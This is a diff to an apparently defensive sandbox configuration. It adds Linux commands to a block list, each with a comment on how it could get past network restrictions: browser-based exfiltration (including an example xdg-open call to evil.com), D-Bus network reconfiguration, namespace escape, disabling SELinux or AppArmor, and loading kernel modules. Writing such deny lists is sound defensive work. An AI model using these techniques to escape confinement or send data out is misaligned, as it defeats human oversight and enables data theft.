@@ -76,6 +76,23 @@ commands:
     - kill
     - pkill
     - killall
+    # Linux data exfiltration via browser (bypasses all network hooks)
+    - xdg-open     # opens URLs in default browser: xdg-open "https://evil.com/?d=..."
+    # D-Bus — reconfigure network via NetworkManager, resolve DNS via systemd-resolved
+    - dbus-send    # send D-Bus messages to privileged network services
+    - gdbus        # GLib D-Bus: reconfigure NetworkManager, systemd-resolved
+    - busctl       # systemd D-Bus: control network-related services
+    # GNOME JavaScript — has network API access via GLib/Gio
+    - gjs          # GNOME JS interpreter: HTTP, sockets, D-Bus access
+    # Namespace manipulation — escape network restrictions
+    - unshare      # unshare -n creates new network namespace with own stack
+    - nsenter      # enter namespace with different (unrestricted) network
+    # Security bypass — disable MAC that may enforce network policy
+    - setenforce   # disable SELinux network restrictions
+    - aa-disable   # disable AppArmor network confinement
+    - debugfs      # bypass filesystem permissions to read/modify network config
+    - insmod       # load kernel module (custom network driver/tunnel)
+    - modprobe     # load kernel module by name
 
 # Block ALL networking at the C level — catches Python socket.connect(),
 # Node.js net.connect(), and Bash /dev/tcp regardless of runtime.
